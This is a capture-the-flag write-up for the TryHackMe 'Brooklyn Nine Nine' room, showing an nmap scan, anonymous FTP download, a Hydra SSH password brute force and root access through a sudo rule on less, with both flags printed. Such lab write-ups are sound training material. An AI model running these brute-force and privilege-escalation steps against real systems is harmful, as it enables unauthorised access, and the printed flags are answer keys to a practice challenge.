## Brooklyn Nine Nine - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/brooklynninenine)

<i>This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.</i>

**IP: 10.10.66.96**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute Force <br>

**Tools Used**: Nmap, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap, I also ran Gobuster but it didn't find anything useful.

  ```
  nmap -sC -sV -T5 -p- 10.10.66.96

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.8.120.52
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
  |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
  |_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Since port 21 is open and allows Anonymous access let's get inside and download all necessary files.

  ```
  ftp 1.10.66.96
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls
  229 Entering Extended Passive Mode (|||42102|)
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
  226 Directory send OK.
  ftp> get note_to_jake.txt
  local: note_to_jake.txt remote: note_to_jake.txt
  229 Entering Extended Passive Mode (|||51690|)
  150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
  100% |************************************************************************|   119      203.52 KiB/s    00:00 ETA
  226 Transfer complete.
  119 bytes received in 00:00 (2.48 KiB/s)
  ```
  
- After reading the note we can see that one user is using weak credentials which means brute forcing will pay out.

  ```
  cat note_to_jake.txt 
  From Amy,
  
  Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
  ```

  ```
  hydra -l jake -P /rockyou.txt 10.10.66.96 ssh      
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 13:36:41
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
  [DATA] attacking ssh://10.10.66.96:22/
  [22][ssh] host: 10.10.66.96   login: jake   password: 987654321
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 2 final worker threads did not complete until end.
  [ERROR] 2 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-12 13:36:44
  ```

- Beautiful, let's now login with SSH and get those flags!

---

## 🧍 User Privilege Escalation

- As always, user flag is already there.

  ```
  jake@10.10.66.96's password: 
  Last login: Tue May 26 08:56:58 2020
  jake@brookly_nine_nine:~$ whoami
  jake
  
  jake@brookly_nine_nine:~$ id
  uid=1000(jake) gid=1000(jake) groups=1000(jake)
  
  jake@brookly_nine_nine:/home$ cd holt
  jake@brookly_nine_nine:/home/holt$ ls -al
  total 48
  drwxr-xr-x 6 holt holt 4096 May 26  2020 .
  drwxr-xr-x 5 root root 4096 May 18  2020 ..
  -rw------- 1 holt holt   18 May 26  2020 .bash_history
  -rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
  -rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
  drwx------ 2 holt holt 4096 May 18  2020 .cache
  drwx------ 3 holt holt 4096 May 18  2020 .gnupg
  drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
  -rw-r--r-- 1 holt holt  807 May 17  2020 .profile
  drwx------ 2 holt holt 4096 May 18  2020 .ssh
  -rw------- 1 root root  110 May 18  2020 nano.save
  -rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
  
  jake@brookly_nine_nine:/home/holt$ cat user.txt 
  ee11cbb19052e40b07aac0ca060c23ee
  ```
  
- Moving to escalation.

---

## 👑 Root Privilege Escalation

- This one wasn't hard as well, when you run `sudo -l` you will see it with your own eyes.

  ```
  jake@brookly_nine_nine:/home/holt$ sudo -l
  Matching Defaults entries for jake on brookly_nine_nine:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jake may run the following commands on brookly_nine_nine:
      (ALL) NOPASSWD: /usr/bin/less
      
  jake@brookly_nine_nine:/home/holt$ sudo less /root/root.txt
  
  -- Creator : Fsociety2006 --
  Congratulations in rooting Brooklyn Nine Nine
  Here is the flag: 63a9f0ea7bb98050796b649e85481845
  
  Enjoy!!
  ```
  
- We will meet in the next one, bye! 

---

## 🏁 Flags

- **User Flag**: `ee11cbb19052e40b07aac0ca060c23ee`
- **Root Flag**: `63a9f0ea7bb98050796b649e85481845`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Pretty basic room tho.`

- What did I learn?
  `Nothing new, just sharpening my skillzzzzz.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
